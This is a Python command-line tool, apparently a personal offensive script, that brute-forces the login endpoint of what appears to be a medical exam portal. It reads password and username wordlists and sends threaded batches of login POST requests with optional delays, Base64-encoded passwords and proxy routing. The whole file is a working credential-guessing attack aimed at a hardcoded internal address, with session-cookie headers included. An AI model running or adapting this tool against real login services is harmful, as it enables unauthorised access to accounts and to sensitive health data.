import argparse
import base64
import requests
import threading
import time
import pyfiglet
import sys

def enviar_requisicao(username, password, use_base64, proxy):
    url = 'http://10.0.10.12:13700/api/v1.0/login/medico'
    headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Access-Control-Allow-Methods': 'GET, POST, PATCH, PUT, DELETE, OPTIONS',
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Accept': 'application/json',
            'Access-Control-Allow-Headers': 'Origin, Content-Type, X-Auth-Token',
            'Sec-GPC': '1',
            'Accept-Language': 'en-US,en',
            'Origin': 'http://10.0.10.12:13700',
            'Referer': 'http://10.0.10.12:13700/login',
            'Cookie': '__cookies_mv_portal_de_exames_2023.004.09={"token":"45.175.118.117"}; patient-user-login=0'
    }
    # Codificar o valor do parâmetro senha em Base64 se a opção --base64=senha for fornecida
    if use_base64 == 'senha':
        password = base64.b64encode(password.encode()).decode()
    payload = {
            "usuario": username,
            "senha": password
    }
    proxies = {
        'http': proxy,
        'https': proxy
    }
    try:
        response = requests.post(url, headers=headers, json=payload, proxies=proxies)
        print(f'Status para usuário {username} e senha {password}: {response.status_code}')
    except Exception as e:
        print(f'Erro ao enviar requisição para usuário {username} e senha {password}: {e}')

def enviar_lotes_requisicoes(username, passwords, num_threads, delay_lote=None, use_base64=None, proxy=None):
    lote_size = num_threads
    num_passwords = len(passwords)
    for i in range(0, num_passwords, lote_size):
        lote_passwords = passwords[i:i + lote_size]
        threads = []
        for password in lote_passwords:
            thread = threading.Thread(target=enviar_requisicao, args=(username, password, use_base64, proxy))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if delay_lote and i + lote_size < num_passwords:
            time.sleep(delay_lote)

if __name__ == "__main__":
    banner_text = pyfiglet.figlet_format("ACKEMED")
    print(f'CreateBy \n{banner_text}                             (Bruno Campos)\n\n')

    parser = argparse.ArgumentParser(description='BC Brute Force WEB Login - Envia requisições POST com uma lista de senhas.')
    parser.add_argument('-w', '--wordlist', type=str, help='Caminho para a wordlist contendo as senhas.', required=True)
    parser.add_argument('-t', '--num_threads', type=int, help='Quantidade de threads para enviar as requisições em cada lote.', required=True)
    parser.add_argument('-u', '--username', nargs='?', type=str, help='Nome de usuário para enviar as requisições.', const=None)
    parser.add_argument('-U', '--userlist', type=str, help='Caminho para o arquivo contendo uma lista de usuários.', default=None)
    parser.add_argument('-d', '--delay', type=float, help='Atraso entre os lotes de requisições (segundos).', default=None)
    parser.add_argument('--base64', type=str, help='Parâmetro(s) a ser(em) codificado(s) em Base64. Ex: --base64=senha', default=None)
    parser.add_argument('-p', '--proxy', type=str, help='Endereço do proxy a ser usado para todas as requisições.', default=None)
    args = parser.parse_args()

    if args.userlist:
        with open(args.userlist, 'r') as user_file:
            usernames = [line.strip() for line in user_file.readlines()]
    elif args.username:
        usernames = [args.username]
    else:
        print("Você deve fornecer um único usuário (-u) ou uma lista de usuários (-U).")
        sys.exit(1)

    with open(args.wordlist, 'r') as file:
        passwords = [line.strip() for line in file.readlines()]

    for username in usernames:
        enviar_lotes_requisicoes(username, passwords, args.num_threads, args.delay, args.base64, args.proxy)
